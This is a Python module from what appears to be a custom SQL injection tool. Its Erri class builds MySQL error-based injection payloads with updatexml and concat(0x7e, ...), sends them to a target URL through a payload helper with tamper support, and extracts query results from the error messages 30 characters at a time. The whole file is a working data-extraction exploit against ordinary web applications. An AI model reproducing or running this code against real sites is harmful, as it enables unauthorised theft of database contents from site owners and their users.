import requests

from sqli.tamper.Default import default
from sqli.payload import payload
import re


class Erri:
    blindSql = "updatexml(1,concat(0x7e,substr(({0}),{1},30),0x7e),1)"
    lenSql = "updatexml(1,concat(0x7e,length(({0})),0x7e),1)"
    method = 'GET'
    pattern = re.compile(r'\'~[\s\S]+~\'')

    def __init__(self, http='', tamper=default()):
        self.http = http
        self.tamper = tamper

    def resLen(self, fuckSql):
        sql = self.lenSql.format(fuckSql)
        req = payload(self.http, sql, self.tamper)
        lens = self.pattern.findall(req.result.text)[0]
        lens = lens[2:-2]
        return int(lens)

    def get(self, fuckSql):
        result = ''
        lens = self.resLen(fuckSql)
        for i in range(1, lens+1, 30):
            sql = self.blindSql.format(fuckSql, i)
            req = payload(self.http, sql, self.tamper)
            text = req.result.text
            text = self.pattern.findall(text)
            if len(text) != 0:
                text = text[0][2:-2]
                result += text
        print(result.replace(',', ',\n').replace('::', ' :: '))
        return result
